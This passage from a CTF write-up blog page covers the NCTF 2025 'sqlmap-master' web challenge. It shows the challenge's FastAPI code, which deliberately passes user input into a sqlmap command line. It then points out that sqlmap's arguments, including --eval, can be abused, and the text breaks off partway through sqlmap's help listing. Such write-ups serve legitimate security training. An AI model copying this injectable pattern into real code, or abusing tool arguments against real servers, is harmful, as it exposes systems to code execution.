@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>NCTF 2025 Web Writeup&amp;Challenge Walkthrough - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="NCTF 2025 Web Writeup&amp;Challenge Walkthrough"><meta name="keywords" content='CTF'>
+  <meta itemprop="name" content="NCTF 2025 Web Writeup&Challenge Walkthrough">
+  <meta itemprop="description" content="NCTF 2025 Web Writeup&amp;Challenge Walkthrough">
+  <meta itemprop="datePublished" content="2025-03-24T10:34:28+00:00">
+  <meta itemprop="dateModified" content="2026-07-09T18:37:36+08:00">
+  <meta itemprop="wordCount" content="2108">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="CTF"><meta property="og:url" content="https://sw1mblu3.fun/posts/nctf-2025%E6%98%A5%E5%AD%A3%E8%B5%9B/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="NCTF 2025 Web Writeup&Challenge Walkthrough">
+  <meta property="og:description" content="NCTF 2025 Web Writeup&amp;Challenge Walkthrough">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-24T10:34:28+00:00">
+    <meta property="article:modified_time" content="2026-07-09T18:37:36+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+<meta name="twitter:card" content="summary" /><meta name="twitter:site" content="@L1nq1_" />
+  <meta name="twitter:creator" content="@L1nq1_" /><meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg" /><meta name="twitter:title" content="NCTF 2025 Web Writeup&amp;Challenge Walkthrough" /><meta name="twitter:description" content="NCTF 2025 Web Writeup&amp;Challenge Walkthrough" /><meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/nctf-2025%E6%98%A5%E5%AD%A3%E8%B5%9B/" title="NCTF 2025 Web Writeup&amp;Challenge Walkthrough - L1nq Blog" /><link rel="prev" type="text/html" href="https://sw1mblu3.fun/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/" title="强网杯 2024 初赛 Web Challenge Walkthrough" /><link rel="next" type="text/html" href="https://sw1mblu3.fun/posts/polarctf-2025%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/" title="PolarCTF 2025 春季个人赛 Web Writeup" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/nctf-2025%E6%98%A5%E5%AD%A3%E8%B5%9B/index.md" title="NCTF 2025 Web Writeup&Challenge Walkthrough - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "NCTF 2025 Web Writeup\u0026Challenge Walkthrough",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/nctf-2025%E6%98%A5%E5%AD%A3%E8%B5%9B\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "CTF","wordcount":  2108 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/nctf-2025%E6%98%A5%E5%AD%A3%E8%B5%9B\/","datePublished": "2025-03-24T10:34:28+00:00","dateModified": "2026-07-09T18:37:36+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script><meta name="view-transition" content="same-origin">
+<script>
+(function() {
+  
+  var hasNative = false;
+  try {
+    if (typeof CSS !== 'undefined' && CSS.supports) {
+      hasNative = CSS.supports('selector(::view-transition-old(root))');
+    }
+  } catch(e) {}
+  if (hasNative) return;
+
+  
+  document.addEventListener('click', function(e) {
+    var a = (e.target && e.target.closest) ? e.target.closest('a') : null;
+    if (!a || !a.href) return;
+    var url;
+    try { url = new URL(a.href, location.href); } catch(e) { return; }
+    if (url.origin !== location.origin) return;
+    if (a.target && a.target === '_blank') return;
+    if (a.hasAttribute && a.hasAttribute('download')) return;
+    if (e.metaKey || e.ctrlKey || e.altKey || e.shiftKey) return;
+
+    e.preventDefault();
+    try { sessionStorage.setItem('_vt', '1'); } catch(e) {}
+    document.documentElement.style.opacity = '0';
+    document.documentElement.style.transition = 'opacity 0.12s ease-out';
+    setTimeout(function() { location.href = a.href; }, 120);
+  }, { capture: true });
+
+  
+  try {
+    if (sessionStorage.getItem('_vt') === '1') {
+      sessionStorage.removeItem('_vt');
+      document.documentElement.style.opacity = '0';
+      document.documentElement.style.transition = 'none';
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() {
+          document.documentElement.style.transition = 'opacity 0.2s ease-in';
+          document.documentElement.style.opacity = '1';
+        });
+      });
+    }
+  } catch(e) {}
+})();
+</script>
+</head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto">
+    <div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>NCTF 2025 Web Writeup&amp;Challenge Walkthrough</span>
+      </h1></div><div class="post-meta">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="meta-calendar-icon">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"/>
+        <path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/>
+        <path d="M7 14h.013"/><path d="M10.01 14h.005"/><path d="M13.01 14h.005"/><path d="M16.015 14h.005"/>
+        <path d="M13.015 17h.005"/><path d="M7.01 17h.005"/><path d="M10.01 17h.005"/>
+      </svg><time datetime="2025-03-24T10:34:28Z">24 Mar, 2025</time><span aria-hidden="true">|</span>
+        <a href="true" target="_blank" rel="noopener noreferrer">Edit this page</a></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#sqlmap-master">sqlmap-master</a></li>
+    <li><a href="#ez_dash复现">ez_dash(复现)</a></li>
+    <li><a href="#ez_dash_revenge复现">ez_dash_revenge(复现)</a></li>
+    <li><a href="#h2-revenge暂未复现">H2 Revenge(暂未复现)</a></li>
+    <li><a href="#internal_api暂未复现">internal_api(暂未复现)</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>NCTF 2025 Web Writeup&amp;Challenge Walkthrough</p>
+<h1 class="heading-element" id="sqlmap-master"><span>sqlmap-master</span>
+  <a href="#sqlmap-master" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><figure>
+  <img src="file-20250322201626515.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>打开题目，一个输入框
+<figure>
+  <img src="file-20250322201618017.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>当点击 <code>Inject</code> 会触发 <code>runInject()</code> 函数体执行，将写入的内容通过 HTTP POST 请求发送给 <code>/run</code> 路由，并异步接收来自路由的响应数据，然后逐步将响应内容显示在页面上
+<figure>
+  <img src="file-20250322175541082.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p>下载题目附件
+<figure>
+  <img src="file-20250322173823439.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p><strong>源码分析</strong>
+源码很短也很简单，使用 <code>FastAPI</code> 框架搭建网站，提供了两个路由：根路由，返回首页 <code>index.html</code>，另一个 <code>/run</code> 路由，用来接收来自前端的 URL 参数并触发 <strong>sqlmap</strong> 执行，执行结果通过 <code>StreamingResponse</code> 传输给前端</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"># main.py
+</span></span><span class="line"><span class="cl">from fastapi import FastAPI, Request
+</span></span><span class="line"><span class="cl">from fastapi.responses import FileResponse, StreamingResponse
+</span></span><span class="line"><span class="cl">import subprocess
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">app = FastAPI()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.get(&#34;/&#34;)
+</span></span><span class="line"><span class="cl">async def index():
+</span></span><span class="line"><span class="cl">    return FileResponse(&#34;index.html&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.post(&#34;/run&#34;)
+</span></span><span class="line"><span class="cl">async def run(request: Request):
+</span></span><span class="line"><span class="cl">    data = await request.json()
+</span></span><span class="line"><span class="cl">    url = data.get(&#34;url&#34;)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    if not url:
+</span></span><span class="line"><span class="cl">        return {&#34;error&#34;: &#34;URL is required&#34;}
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    command = f&#39;sqlmap -u {url} --batch --flush-session&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    def generate():
+</span></span><span class="line"><span class="cl">        process = subprocess.Popen(
+</span></span><span class="line"><span class="cl">            command.split(),
+</span></span><span class="line"><span class="cl">            stdout=subprocess.PIPE,
+</span></span><span class="line"><span class="cl">            stderr=subprocess.STDOUT,
+</span></span><span class="line"><span class="cl">            shell=False
+</span></span><span class="line"><span class="cl">        )
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        while True:
+</span></span><span class="line"><span class="cl">            output = process.stdout.readline()
+</span></span><span class="line"><span class="cl">            if output == &#39;&#39; and process.poll() is not None:
+</span></span><span class="line"><span class="cl">                break
+</span></span><span class="line"><span class="cl">            if output:
+</span></span><span class="line"><span class="cl">                yield output
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    return StreamingResponse(generate(), media_type=&#34;text/plain&#34;)</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>靶机不出网，随便输入，页面返回了 SQLMAP 的执行结果
+<figure>
+  <img src="file-20250322201649960.png" alt="image-20250221181200747" loading="lazy"></figure>
+</p>
+<p><code>subprocess.Popen()</code> 设置 <code>shell=False</code>，无法使用常规的命令注入技巧，但 <code>SQLMAP</code> 参数仍然可控，<code>Github</code> 检索一下 <code>sqlmap</code> 可利用的参数：</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="3" style="--fi-max-shown-lines:30;--fi-line-digit:3;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Usage: python sqlmap.py [options]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Options:
+</span></span><span class="line"><span class="cl">  -h, --help            Show basic help message and exit
+</span></span><span class="line"><span class="cl">  -hh                   Show advanced help message and exit
+</span></span><span class="line"><span class="cl">  --version             Show program&#39;s version number and exit
+</span></span><span class="line"><span class="cl">  -v VERBOSE            Verbosity level: 0-6 (default 1)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Target:
+</span></span><span class="line"><span class="cl">    At least one of these options has to be provided to define the
+</span></span><span class="line"><span class="cl">    target(s)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    -u URL, --url=URL   Target URL (e.g. &#34;http://www.site.com/vuln.php?id=1&#34;)
+</span></span><span class="line"><span class="cl">    -d DIRECT           Connection string for direct database connection
+</span></span><span class="line"><span class="cl">    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
+</span></span><span class="line"><span class="cl">    -m BULKFILE         Scan multiple targets given in a textual file
+</span></span><span class="line"><span class="cl">    -r REQUESTFILE      Load HTTP request from a file
+</span></span><span class="line"><span class="cl">    -g GOOGLEDORK       Process Google dork results as target URLs
+</span></span><span class="line"><span class="cl">    -c CONFIGFILE       Load options from a configuration INI file
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Request:
+</span></span><span class="line"><span class="cl">    These options can be used to specify how to connect to the target URL
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    -A AGENT, --user..  HTTP User-Agent header value
+</span></span><span class="line"><span class="cl">    -H HEADER, --hea..  Extra header (e.g. &#34;X-Forwarded-For: 127.0.0.1&#34;)
+</span></span><span class="line"><span class="cl">    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
+</span></span><span class="line"><span class="cl">    --data=DATA         Data string to be sent through POST (e.g. &#34;id=1&#34;)
+</span></span><span class="line"><span class="cl">    --param-del=PARA..  Character used for splitting parameter values (e.g. &amp;)
+</span></span><span class="line"><span class="cl">    --cookie=COOKIE     HTTP Cookie header value (e.g. &#34;PHPSESSID=a8d127e..&#34;)
+</span></span><span class="line"><span class="cl">    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
+</span></span><span class="line"><span class="cl">    --live-cookies=L..  Live cookies file used for loading up-to-date values
+</span></span><span class="line"><span class="cl">    --load-cookies=L..  File containing cookies in Netscape/wget format
+</span></span><span class="line"><span class="cl">    --drop-set-cookie   Ignore Set-Cookie header from response
+</span></span><span class="line"><span class="cl">    --mobile            Imitate smartphone through HTTP User-Agent header
+</span></span><span class="line"><span class="cl">    --random-agent      Use randomly selected HTTP User-Agent header value
+</span></span><span class="line"><span class="cl">    --host=HOST         HTTP Host header value
+</span></span><span class="line"><span class="cl">    --referer=REFERER   HTTP Referer header value
+</span></span><span class="line"><span class="cl">    --headers=HEADERS   Extra headers (e.g. &#34;Accept-Language: fr\nETag: 123&#34;)
+</span></span><span class="line"><span class="cl">    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)
+</span></span><span class="line"><span class="cl">    --auth-cred=AUTH..  HTTP authentication credentials (name:password)
+</span></span><span class="line"><span class="cl">    --auth-file=AUTH..  HTTP authentication PEM cert/private key file
+</span></span><span class="line"><span class="cl">    --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)
+</span></span><span class="line"><span class="cl">    --ignore-proxy      Ignore system default proxy settings
+</span></span><span class="line"><span class="cl">    --ignore-redirects  Ignore redirection attempts
+</span></span><span class="line"><span class="cl">    --ignore-timeouts   Ignore connection timeouts
+</span></span><span class="line"><span class="cl">    --proxy=PROXY       Use a proxy to connect to the target URL
+</span></span><span class="line"><span class="cl">    --proxy-cred=PRO..  Proxy authentication credentials (name:password)
+</span></span><span class="line"><span class="cl">    --proxy-file=PRO..  Load proxy list from a file
+</span></span><span class="line"><span class="cl">    --proxy-freq=PRO..  Requests between change of proxy from a given list
+</span></span><span class="line"><span class="cl">    --tor               Use Tor anonymity network
+</span></span><span class="line"><span class="cl">    --tor-port=TORPORT  Set Tor proxy port other than default
+</span></span><span class="line"><span class="cl">    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
+</span></span><span class="line"><span class="cl">    --check-tor         Check to see if Tor is used properly
+</span></span><span class="line"><span class="cl">    --delay=DELAY       Delay in seconds between each HTTP request
+</span></span><span class="line"><span class="cl">    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
+</span></span><span class="line"><span class="cl">    --retries=RETRIES   Retries when the connection timeouts (default 3)
+</span></span><span class="line"><span class="cl">    --randomize=RPARAM  Randomly change value for given parameter(s)
+</span></span><span class="line"><span class="cl">    --safe-url=SAFEURL  URL address to visit frequently during testing
+</span></span><span class="line"><span class="cl">    --safe-post=SAFE..  POST data to send to a safe URL
+</span></span><span class="line"><span class="cl">    --safe-req=SAFER..  Load safe HTTP request from a file
+</span></span><span class="line"><span class="cl">    --safe-freq=SAFE..  Regular requests between visits to a safe URL
+</span></span><span class="line"><span class="cl">    --skip-urlencode    Skip URL encoding of payload data
+</span></span><span class="line"><span class="cl">    --csrf-token=CSR..  Parameter used to hold anti-CSRF token
+</span></span><span class="line"><span class="cl">    --csrf-url=CSRFURL  URL address to visit for extraction of anti-CSRF token
+</span></span><span class="line"><span class="cl">    --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit
+</span></span><span class="line"><span class="cl">    --csrf-retries=C..  Retries for anti-CSRF token retrieval (default 0)
+</span></span><span class="line"><span class="cl">    --force-ssl         Force usage of SSL/HTTPS
+</span></span><span class="line"><span class="cl">    --chunked           Use HTTP chunked transfer encoded (POST) requests
+</span></span><span class="line"><span class="cl">    --hpp               Use HTTP parameter pollution method
+</span></span><span class="line"><span class="cl">    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
+</span></span><span class="line"><span class="cl">                        &#34;import hashlib;id2=hashlib.md5(id).hexdigest()&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Optimization:
+</span></span><span class="line"><span class="cl">    These options can be used to optimize the performance of sqlmap
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    -o                  Turn on all optimization switches
+</span></span><span class="line"><span class="cl">    --predict-output    Predict common queries output
+</span></span><span class="line"><span class="cl">    --keep-alive        Use persistent HTTP(s) connections
+</span></span><span class="line"><span class="cl">    --null-connection   Retrieve page length without actual HTTP response body
+</span></span><span class="line"><span class="cl">    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Injection:
+</span></span><span class="line"><span class="cl">    These options can be used to specify which parameters to test for,
+</span></span><span class="line"><span class="cl">    provide custom injection payloads and optional tampering scripts
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    -p TESTPARAMETER    Testable parameter(s)
+</span></span><span class="line"><span class="cl">    --skip=SKIP         Skip testing for given parameter(s)
+</span></span><span class="line"><span class="cl">    --skip-static       Skip testing parameters that not appear to be dynamic
+</span></span><span class="line"><span class="cl">    --param-exclude=..  Regexp to exclude parameters from testing (e.g. &#34;ses&#34;)
+</span></span><span class="line"><span class="cl">    --param-filter=P..  Select testable parameter(s) by place (e.g. &#34;POST&#34;)
+</span></span><span class="line"><span class="cl">    --dbms=DBMS         Force back-end DBMS to provided value
+</span></span><span class="line"><span class="cl">    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
+</span></span><span class="line"><span class="cl">    --os=OS             Force back-end DBMS operating system to provided value
+</span></span><span class="line"><span class="cl">    --invalid-bignum    Use big numbers for invalidating values
+</span></span><span class="line"><span class="cl">    --invalid-logical   Use logical operations for invalidating values
+</span></span><span class="line"><span class="cl">    --invalid-string    Use random strings for invalidating values
+</span></span><span class="line"><span class="cl">    --no-cast           Turn off payload casting mechanism
+</span></span><span class="line"><span class="cl">    --no-escape         Turn off string escaping mechanism
+</span></span><span class="line"><span class="cl">    --prefix=PREFIX     Injection payload prefix string
+</span></span><span class="line"><span class="cl">    --suffix=SUFFIX     Injection payload suffix string
+</span></span><span class="line"><span class="cl">    --tamper=TAMPER     Use given script(s) for tampering injection data
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Detection:
+</span></span><span class="line"><span class="cl">    These options can be used to customize the detection phase
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    --level=LEVEL       Level of tests to perform (1-5, default 1)
+</span></span><span class="line"><span class="cl">    --risk=RISK         Risk of tests to perform (1-3, default 1)
+</span></span><span class="line"><span class="cl">    --string=STRING     String to match when query is evaluated to True
+</span></span><span class="line"><span class="cl">    --not-string=NOT..  String to match when query is evaluated to False
+</span></span><span class="line"><span class="cl">    --regexp=REGEXP     Regexp to match when query is evaluated to True
+</span></span><span class="line"><span class="cl">    --code=CODE         HTTP code to match when query is evaluated to True
+</span></span><span class="line"><span class="cl">    --smart             Perform thorough tests only if positive heuristic(s)
+</span></span><span class="line"><span class="cl">    --text-only         Compare pages based only on the textual content
+</span></span><span class="line"><span class="cl">    --titles            Compare pages based only on their titles
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Techniques:
+</span></span><span class="line"><span class="cl">    These options can be used to tweak testing of specific SQL injection
+</span></span><span class="line"><span class="cl">    techniques
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    --technique=TECH..  SQL injection techniques to use (default &#34;BEUSTQ&#34;)
+</span></span><span class="line"><span class="cl">    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
+</span></span><span class="line"><span class="cl">    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
+</span></span><span class="line"><span class="cl">    --union-char=UCHAR  Character to use for bruteforcing number of columns
+</span></span><span class="line"><span class="cl">    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
+</span></span><span class="line"><span class="cl">    --dns-domain=DNS..  Domain name used for DNS exfiltration attack
+</span></span><span class="line"><span class="cl">    --second-url=SEC..  Resulting page URL searched for second-order response
+</span></span><span class="line"><span class="cl">    --second-req=SEC..  Load second-order HTTP request from file
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Fingerprint:
+</span></span><span class="line"><span class="cl">    -f, --fingerprint   Perform an extensive DBMS version fingerprint
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Enumeration:
+</span></span><span class="line"><span class="cl">    These options can be used to enumerate the back-end database
+</span></span><span class="line"><span class="cl">    management system information, structure and data contained in the
+</span></span><span class="line"><span class="cl">    tables
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    -a, --all           Retrieve everything
+</span></span><span class="line"><span class="cl">    -b, --banner        Retrieve DBMS banner
+</span></span><span class="line"><span class="cl">    --current-user      Retrieve DBMS current user
+</span></span><span class="line"><span class="cl">    --current-db        Retrieve DBMS current database
+</span></span><span class="line"><span class="cl">    --hostname          Retrieve DBMS server hostname
+</span></span><span class="line"><span class="cl">    --is-dba            Detect if the DBMS current user is DBA
+</span></span><span class="line"><span class="cl">    --users             Enumerate DBMS users
+</span></span><span class="line"><span class="cl">    --passwords         Enumerate DBMS users password hashes
+</span></span><span class="line"><span class="cl">    --privileges        Enumerate DBMS users privileges
+</span></span><span class="line"><span class="cl">    --roles             Enumerate DBMS users roles
+</span></span><span class="line"><span class="cl">    --dbs               Enumerate DBMS databases
+</span></span><span class="line"><span class="cl">    --tables            Enumerate DBMS database tables
+</span></span><span class="line"><span class="cl">    --columns           Enumerate DBMS database table columns
+</span></span><span class="line"><span class="cl">    --schema            Enumerate DBMS schema
+</span></span><span class="line"><span class="cl">    --count             Retrieve number of entries for table(s)
+</span></span><span class="line"><span class="cl">    --dump              Dump DBMS database table entries
+</span></span><span class="line"><span class="cl">    --dump-all          Dump all DBMS databases tables entries
+</span></span><span class="line"><span class="cl">    --search            Search column(s), table(s) and/or database name(s)
+</span></span><span class="line"><span class="cl">    --comments          Check for DBMS comments during enumeration
+</span></span><span class="line"><span class="cl">    --statements        Retrieve SQL statements being run on DBMS
+</span></span><span class="line"><span class="cl">    -D DB               DBMS database to enumerate
+</span></span><span class="line"><span class="cl">    -T TBL              DBMS database table(s) to enumerate
